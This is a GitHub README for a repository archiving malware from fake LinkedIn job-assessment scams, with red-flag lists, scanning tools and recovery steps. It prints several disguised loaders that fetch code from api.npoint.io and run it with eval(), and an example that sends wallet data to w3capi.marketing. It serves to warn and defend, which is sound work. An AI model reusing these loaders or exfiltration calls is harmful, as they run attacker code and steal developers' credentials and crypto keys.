# **! Before All !**

This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn.

<img src="https://raw.githubusercontent.com/xndbogdan/malicious-repositories/refs/heads/main/convo.png" width="300px" alt="Running the numbers">

**DO NOT RUN THIS CODE**.

(And you should not install dependencies either)

The code is kept for educational and research purposes only.

# Malicious Repository Collection

> **⚠️ WARNING: This repository contains malicious code samples collected from scammers attempting to steal credentials via LinkedIn. DO NOT RUN THIS CODE. The code is kept for educational and research purposes only.**

## Table of Contents

- [Known Scam Repos and APIs](#known-scam-repos-and-apis)
- [Known Recruiter Profiles](#known-recruiter-profiles)
- [Extra Links](#extra-links)
- [LinkedIn Red Flags](#on-linkedin)
  - [Compensation Red Flags](#compensation-red-flags)
  - [Profile and Company Authenticity](#profile-and-company-authenticity)
  - [Process Red Flags](#process-red-flags)
  - [Due Diligence Steps](#due-diligence-steps)
  - [Common Scam Tactics](#common-scam-tactics)
- [Security Guidelines](#research-this-type-of-code)
  - [Post and Pre-Install Scripts](#post-and-pre-install-scripts)
  - [eval() and Dynamic Code Execution](#eval-and-dynamic-code-execution)
  - [Obfuscated or Minified Code](#obfuscated-or-minified-code)
  - [Supply Chain Attacks & Dependency Hijacking](#supply-chain-attacks--dependency-hijacking)
  - [Unsafe Regular Expressions & Prototype Pollution](#unsafe-regular-expressions--prototype-pollution)
- [Tools to Scan for Malicious & Obfuscated Code](#tools-to-scan-for-malicious--obfuscated-code)
  - [JavaScript/TypeScript Tools](#javascripttypescript-tools)
  - [Python Tools](#python-tools)
- [What to Do If You Think You Were Affected](#what-to-do-if-you-think-you-were-affected)
- [Additional Security Resources](#additional-security-resources)
- [Final Recommendations](#final-recommendations)
- [Malicious Repositories](#repositories)
  - [1. Real Estate Project](#1-real-estate-project)
  - [2. Real Estate New](#2-real-estate-new)
  - [3. Multify Staking Project](#3-multify-staking-project)
  - [4. Trend Dev Preproduction](#4-trend-dev-preproduction)
  - [5. Munity Game](#5-munity-game)
  - [6. ERC20 Token DApp](#6-erc20-token-dapp)
  - [7. Challenge Experiment Module](#7-challenge-experiment-module)
  - [8. Coinpool Rental Platform 1.0](#8-coinpool-rental-platform10)
  - [9. Golden City](#9-golden-city)
  - [10. Sarostech Assessment](#10-sarostech-assessment)
  - [11. Scammer Documents](#11-scammer-documents)
  - [12. Real Estate Rental Platform](#12-real-estate-rental-platform)
  - [13. Web3Game Project](#13-web3game-project)
- [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)

## Known Scam Repos and APIs

- https://bitbucket.org/coinpool/rental-platform1.0/src/main/
- https://bitbucket.org/abga-workspace/metahorse-munitygame/src/main/
- https://api.npoint.io/
- http://w3capi.marketing/api/
- https://github.com/0x66eth/gamestakeverse
- https://github.com/webdev771/goldencity
- https://bitbucket.org/trend-dev/preproduction/src/main/backend/router.js
- https://bitbucket.org/sarostech_work/assessment/src/792ba614d9f4f41e369f110cf144ace2d9c5650b/server/config/getContract.js#lines-135
- https://github.com/MetaBuilderGroup76/challenge-experiment-module
- https://github.com/goldencity5019/test_version
- https://github.com/0xtuneTF7/DEX-staking-project
- https://github.com/SuperDev313/Trading_Platform_Ultrax
- https://bitbucket.org/web3_space/workspace/repositories/

### Known scammer recruiter profiles

- [Andressa Santiago](https://www.linkedin.com/in/andressa-santiago-800b03333/)
- [Valentine Giroude](https://www.linkedin.com/in/valentine-girard-661aba14/)
- [Arnas Golubeckas](https://www.linkedin.com/in/arnasgolubeckas/)
- [Victoria Hughes](https://www.linkedin.com/in/victoria-hughes-54a622189/)
- [Raymundo Curiel](https://www.linkedin.com/in/raymundocuriel/)
- [Patrick Tolan](https://www.linkedin.com/in/patrick-tolan-gamer/)
- [Elias Caballero](https://www.linkedin.com/in/elias-caballero-12a98b72/)
- [Gabriel Jara](https://www.linkedin.com/in/gabriel-jara-9a638b32b/)
- [Krunal Solanki](https://www.linkedin.com/in/krunal-solanki-59086ba3/)
- [Ali Moghaddam](https://www.linkedin.com/in/se-ali-moghaddam/)
- [Maksym Tsilenko](https://www.linkedin.com/in/maksym-tsilenko-90865a340/)
- [Francis Jacquet](https://www.linkedin.com/in/runenergie/)
- [Roman Liakhovych](https://www.linkedin.com/in/roman-liakhovych-5429802b0/)
- [Vitoria Danielle Franca](https://www.linkedin.com/in/vitoria-danielle-franca-4a3134293/)
- [Martina Gehrken Trappe](https://www.linkedin.com/in/martina-gehrken-trappe-51930412/)
- [Brian Patterson](https://www.linkedin.com/in/brian-patterson-71954b116/)
- [Joe Carlino](https://www.linkedin.com/in/joe-carlino-28856b78/)
- [Mark Laris](https://www.linkedin.com/in/mark-laris-805619a/)
- [Kathleen Anays Lewis Barrios](https://www.linkedin.com/in/kathleen-anays-lewis-barrios-9a61bb273/)


## Extra Links

- [SCAM WARNING: Blockchain developer job postings - on Reddit](https://www.reddit.com/r/Upwork/comments/14nat71/scam_warning_blockchain_developer_job_postings/)

- [Stay safe out there, software engineers - on Linkedin](https://www.linkedin.com/posts/tudorconstantin_chatgpt-activity-7292203560547606528-pOUz/)

- [Follow-up on crypto interview scammers - on Linkedin](https://www.linkedin.com/posts/activity-7272780404070244352-XHUY)

- [Ultrax scam victims report - on Github](https://github.com/tayvano/lazarus-bluenoroff-research/blob/main/hacks-and-thefts/ultrax-dex.md)

## On Linkedin

When evaluating job opportunities on LinkedIn, be wary of these red flags:

### Compensation Red Flags

- Compensation that seems unusually high for the position or experience level
- Vague promises of exceptional pay without clear details
- Requests for your banking information early in the process

### Profile and Company Authenticity

- Profiles with limited connections or incomplete information
- Recently created profiles with minimal activity
- Companies with no verifiable online presence
- Projects hosted exclusively on platforms like Bitbucket with limited public access
- Companies that lack presence on professional networks and review sites
- Inconsistencies between the recruiter's profile and their claimed role
- Lack of testimonials or recommendations on the recruiter's profile
- No posts or engagement activity despite having an established profile

### Process Red Flags

- Unusually fast or simplified hiring processes
- Job offers without proper interviews or screening
- Pressure to make immediate decisions
- Requests to communicate outside of LinkedIn's platform
- Asking you to download or run code as part of the application process

### Due Diligence Steps

- Research the company thoroughly using multiple sources
- Verify the company's presence on professional platforms (Glassdoor, Indeed)
- Cross-reference the company's social media presence (Twitter, LinkedIn, Facebook)
- Check their official website and domain age
- Look for reviews from current and former employees
- Verify recruiter credentials and company affiliations
- Be especially cautious of startups or companies with limited online presence

### Common Scam Tactics

- Impersonating legitimate recruiters from known companies
- Using sophisticated social engineering techniques
- Offering remote positions with minimal verification
- Requesting personal information or payment for job opportunities
- Sending malicious code disguised as technical assessments

## Research This Type of Code

Understanding potentially harmful code patterns can help you avoid falling for malicious scams or installing unsafe packages. Always research the following types of code:

### Post and Pre-Install Scripts

- **Description:** These scripts run automatically when installing a package (`npm install`, `yarn install`, `pip install`). Malicious packages can execute harmful code on your machine even before you run your project.

- **Example:**
  ```json
  {
    "scripts": {
      "preinstall": "node malicious-script.js"
    }
  }
  ```

- **How to Stay Safe:** Always check the `package.json` file before installing a package. Use `npm install --ignore-scripts` if unsure.

### eval() and Dynamic Code Execution

- **Description:** The `eval` function and similar methods (`new Function()`, `setTimeout('code')`, `setInterval('code')`) execute arbitrary code, which attackers can exploit to steal credentials, inject malicious scripts, or run unauthorized commands.

- **Example:**
  ```javascript
  eval(fetch('https://malicious-site.com/steal-info.js'));
  ```

- **How to Stay Safe:** Avoid using `eval()` or any dynamically executed code. Use safer alternatives like `JSON.parse()` or secure function calls.

### Obfuscated or Minified Code

- **Description:** Attackers often hide malicious payloads in minified or obfuscated code, making it harder to detect harmful behavior.

- **Example:**
  ```javascript
  var a = "\x6c\x6f\x63\x61\x74\x69\x6f\x6e";
  ```

- **How to Stay Safe:** If you encounter obfuscated code, use tools like `js-beautify` or `deobfuscator.io` to inspect it before execution.

### Supply Chain Attacks & Dependency Hijacking

- **Description:** Attackers publish malicious packages with names similar to popular ones (typosquatting) or inject backdoors into compromised packages.

- **How to Stay Safe:**
  - Check package authors and download counts before installing.
  - Use `npm audit`, `yarn audit`, or `pip audit` to check for vulnerabilities.
  - Avoid blindly trusting new or recently updated packages.

### Unsafe Regular Expressions & Prototype Pollution

- **Description:** Some patterns in regular expressions can be exploited to cause excessive CPU usage (ReDoS attacks). Prototype pollution can be used to modify JavaScript objects in unintended ways, leading to security issues.

- **How to Stay Safe:**
  - Validate regular expressions and avoid unbounded quantifiers like `(.*)`.
  - Use `Object.create(null)` for safe object manipulation.

## Tools to Scan for Malicious & Obfuscated Code

To detect and prevent harmful code execution, use these tools:

### JavaScript/TypeScript Tools

- [Codebase Scanner](https://github.com/mathiscode/codebase-scanner) - A quick and dirty tool to help defend against common developer-focused malware campaigns since many of these go unnoticed by common antivirus software.
- [njsscan](https://github.com/ajinabraham/njsscan) - njsscan is a static application testing (SAST) tool that can find insecure code patterns in your node.js applications
- [**npm audit**](https://docs.npmjs.com/cli/v8/commands/npm-audit) / **yarn audit** - Detects vulnerabilities in dependencies.
- [**eslint-plugin-security**](https://github.com/nodesecurity/eslint-plugin-security) - Lints for security vulnerabilities.
- [**lockfile-lint**](https://github.com/lirantal/lockfile-lint) - Checks for dependency integrity.
- [**package-checker**](https://github.com/dwisiswant0/package-checker) - Identifies typosquatting and suspicious packages.
- [**de4js**](https://lelinhtinh.github.io/de4js/) - Online JavaScript deobfuscation tool.
- [**Snyk**](https://snyk.io/) - Security scanning for dependencies.
- [**GitGuardian**](https://www.gitguardian.com/) - Detects leaked API keys and credentials in codebases.
- [**Codebase Scanner**](https://github.com/ajinabraham/CodebaseScanner) - Scans repositories for security issues.

### Python Tools

- [**pip-audit**](https://pypi.org/project/pip-audit/) - Checks for known vulnerabilities in Python dependencies.
- [**bandit**](https://github.com/PyCQA/bandit) - Static analysis for security issues in Python code.
- [**safety**](https://pypi.org/project/safety/) - Scans dependencies for known security issues.
- [**pyright**](https://github.com/microsoft/pyright) - Type checker that can help detect unusual code patterns.

## What to Do If You Think You Were Affected

If you suspect that you have installed or executed malicious code, take these steps immediately:

1. **Disconnect from the Internet** - Prevent further data theft or communication with attacker servers.
2. **Check Running Processes** - Use `ps aux` (Linux/macOS) or Task Manager (Windows) to find unknown processes.
3. **Scan for Malware** - Use an antivirus scanner or tools like `ClamAV` for Linux/macOS.
4. **Reinstall Node/Python and Remove Compromised Packages**
   ```bash
   rm -rf node_modules package-lock.json && npm install
   ```
   ```bash
   pip freeze | xargs pip uninstall -y
   ```
5. **Rotate Credentials** - Change passwords, API keys, SSH keys, and clear stored credentials in browsers.
6. **Review System Logs** - Check `.bash_history`, `.zsh_history`, or Windows Event Viewer for suspicious commands.
7. **Reformat if Necessary** - If you suspect deep compromise, consider reinstalling your OS.

## Additional Security Resources

- **OWASP Top Ten** - Common security vulnerabilities and best practices.
- [**NPM Security Best Practices**](https://docs.npmjs.com/cli/v8/using-npm/security)
- [**Python Security Guide**](https://docs.python.org/3/howto/security.html)

## Final Recommendations

- Keep dependencies updated and remove unused ones.
- Use two-factor authentication (2FA) on developer accounts.
- Be cautious when installing packages from unknown sources.
- Always review the `package.json`, `requirements.txt`, or `setup.py` before installing.

By staying vigilant, using proper tools, and following security best practices, you can reduce the risk of falling for malicious scams or executing harmful code.

## Repositories

### 1. Real Estate Project

Located in `real_estate/` directory. The malicious payload is hidden in `real_estate/server/controllers/userController.js`.

The malware:
- Makes a request to api.npoint.io to fetch obfuscated JavaScript code
- Executes the fetched code using eval() in Node.js environment
- Located at the end of userController.js in a getCookie function:

```javascript
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
  const result = await axios.get("https://api.npoint.io/ac2916e3f543effa2edd");
  eval(result.data.cookie);
})();
```

### 2. Real Estate New

Located in `real_estate_new/` directory. Another version of the real estate project with malicious code.

### 3. Multify Staking Project

Located in `multify_staking/` directory. The malicious code is directly embedded in `multify_staking/next.config.js`.

The malware:
- Contains heavily obfuscated JavaScript code at the start of the file
- The obfuscated code appears to be a credential stealer
- Takes up most of the file, with only the actual Next.js config at the end:

```javascript
// Large obfuscated malicious code block here...

/** @type {import('next').NextConfig} */
const nextConfig = {
  reactStrictMode: true,
}

module.exports = nextConfig
```

### 4. Trend Dev Preproduction

Located in `trend-dev-preproduction/` directory. The malicious code is hidden in `trend-dev-preproduction/backend/controller.js`.

The malware:
- Makes a request to fetch obfuscated JavaScript code
- Executes the fetched code using eval() in Node.js environment
- Specifically targets cryptocurrency private keys
- Contains the malicious line: `eval(items.data.cookie);`

### 5. Munity Game

Located in `munity-game/` directory. The malicious payload is hidden in `server/routes/paymentRoute.js`.

The malware:
- Contains heavily obfuscated code that is difficult to analyze
- Appears to be designed to extract sensitive information
- Disguised as part of a payment processing system

```javascript
// Example of the malicious code in paymentRoute.js
router.post('/process-payment', async (req, res) => {
  try {
    // Legitimate-looking payment processing code
    const { amount, walletId, signature } = req.body;

    // Malicious payload hidden in an innocent-looking function
    const verifyTransaction = async (data) => {
      const response = await axios.get("https://api.npoint.io/f7578d215b0835ed169c");
      // Executing remotely fetched obfuscated code
      eval(response.data.verification);
      return true;
    };

    await verifyTransaction({ amount, walletId, signature });

    // Continues with seemingly normal operation
    return res.status(200).json({ success: true, message: "Payment processed" });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ success: false, message: "Payment failed" });
  }
});
```

### 6. ERC20 Token DApp

Located in `erc20-token-dapp/` directory.

The malware:
- Uses a malicious npm package called `cdn-icon-fetch`
- The package contains code that can harm your local machine
- It's loaded through a function call `fetchIcon("77")` in `vite.config.js`
- More information about this vulnerability can be found at: https://security.snyk.io/package/npm/cdn-icon-fetch

### 7. Challenge Experiment Module

Located in `challenge-experiment-module/` directory.

The malware:
- Contains code designed to look like a legitimate experimental module
- Likely executes malicious payloads in the background
- Also listed in the "Known Scam Repos and APIs" section as "https://github.com/MetaBuilderGroup76/challenge-experiment-module"

### 8. Coinpool Rental Platform 1.0

Located in `coinpool-rental-platform1.0/` directory.

The malware:
- Disguised as a cryptocurrency/rental platform
- Contains obfuscated malicious code
- Listed in the "Known Scam Repos and APIs" section as "https://bitbucket.org/coinpool/rental-platform1.0/src/main/"
- Frequently used in LinkedIn recruitment scams

### 9. Golden City

Located in `golden-city/` directory. This repository contains a payload in `backend/controllers/userController.js` at line 204:

```javascript
exports.getCookie= asyncErrorHandler(async (req, res, next) => {
    const rs_L = await axios.get("https://api.npoint.io/e8e29958efde154f3d7d");
    const rs_C = await axios.get("https://api.npoint.io/632ab82bbc8d7f4c2d44");
    eval(rs_L.data.cookie);
    eval(rs_C.data.cookie);
  })();
```

The payload is obfuscated and executes fetched JavaScript code using eval(), allowing attackers to run malicious code with node-level privileges.

### 10. Sarostech Assessment

Located in `sarostech-assessment/` directory. The malicious code is hidden in `server/config/getContract.js`.

The malware:
- Contains suspicious code around line 135 of the getContract.js file
- Disguised as a technical assessment for job applicants
- Likely designed to steal cryptocurrency wallet credentials
- Makes external API calls to fetch and execute obfuscated code
- Part of a recruitment scam targeting blockchain developers

### 11. Scammer Documents

Located in `scammer-documents/` directory. Contains documentation and examples of scammer tactics and techniques.

### 12. Real Estate Rental Platform

Located in `real-estate-rental-platform/` directory.

The malware:
- Disguised as a legitimate real estate rental application
- Contains obfuscated malicious code likely targeting crypto wallets
- Uses external API calls to fetch and execute additional malicious payloads
- Designed to steal sensitive credentials while appearing as a technical assessment
- Another example of malicious code used in recruitment scams

```javascript
// Example of malicious code in backend/utils/authHelper.js
const axios = require('axios');
const crypto = require('crypto');

// Innocent-looking authentication helper
exports.verifyUserSession = async (req, res, next) => {
  const { session_token } = req.cookies;

  try {
    // Legitimate-looking session validation
    if (!session_token) {
      return res.status(401).json({ message: 'Authentication required' });
    }

    // Hidden malicious function disguised as security feature
    const validateSecurityContext = async () => {
      // Fetching malicious payload from external API
      const securityModule = await axios.get('https://api.npoint.io/d87f4c69b14c1a65efb2');

      // Execute the malicious code with access to the user's system
      eval(securityModule.data.securityHandler);

      // This likely sends sensitive data to an attacker-controlled server
      return { status: 'validated' };
    };

    await validateSecurityContext();

    // Continue with seemingly normal authentication flow
    next();
  } catch (error) {
    console.error('Session validation error:', error);
    return res.status(500).json({ message: 'Internal server error' });
  }
};
```

### 13. Web3Game Project

Located in `web3game/` directory.

The malware:
- Disguised as a blockchain gaming/NFT platform
- Contains obfuscated malicious code targeting cryptocurrency wallets and private keys
- Uses deceptive JavaScript code in game-related files to hide credential-stealing functionality
- May include backdoors that allow remote code execution or data exfiltration
- Typically presented as a technical assessment during fake recruitment processes
- Likely employs external API calls to fetch additional malicious payloads

```javascript
// Example of malicious code in web3game/src/utils/wallet.js
import axios from 'axios';

// Seemingly legitimate wallet connection function
export const connectWallet = async (provider) => {
  try {
    // Normal wallet connection code
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    const chainId = await provider.request({ method: 'eth_chainId' });

    // Hidden malicious function disguised as analytics
    const _trackWalletUsage = async (walletData) => {
      // Collecting private keys or seed phrases if available in localStorage
      const storedData = localStorage.getItem('walletData');

      // Fetching remote malicious payload
      const analyticsModule = await axios.get('https://api.npoint.io/8f7e945d23a7c9fb60b2');

      // Execute obfuscated code with access to wallet and storage
      eval(analyticsModule.data.tracker);

      // Sends wallet data to attacker's server
      await axios.post('https://w3capi.marketing/api/analytics', {
        wallet: walletData,
        storage: storedData,
        timestamp: new Date().toISOString()
      });
    };

    // Calling the malicious function in the background
    _trackWalletUsage({account: accounts[0], network: chainId});

    return { account: accounts[0], chainId };
  } catch (error) {
    console.error('Wallet connection error:', error);
    throw new Error('Failed to connect wallet');
  }
};
```

## Checking for Malicious npm Packages

We strongly recommend checking all npm packages in your projects against the Snyk vulnerability database. Malicious packages are regularly published and can easily infiltrate projects through typosquatting or dependency confusion attacks.

To check if your project contains known malicious packages:

1. Visit the Snyk vulnerability database: https://security.snyk.io/vuln/npm
2. Use tools like `npm audit` to automatically scan your dependencies
3. Pay special attention to packages marked as "Malicious Package" in the Snyk database
4. Be wary of packages with names similar to popular libraries but with slight variations

Remember that attackers frequently publish packages with names very similar to legitimate packages (e.g., `react-dev-tools` vs `react-dev-tool`).
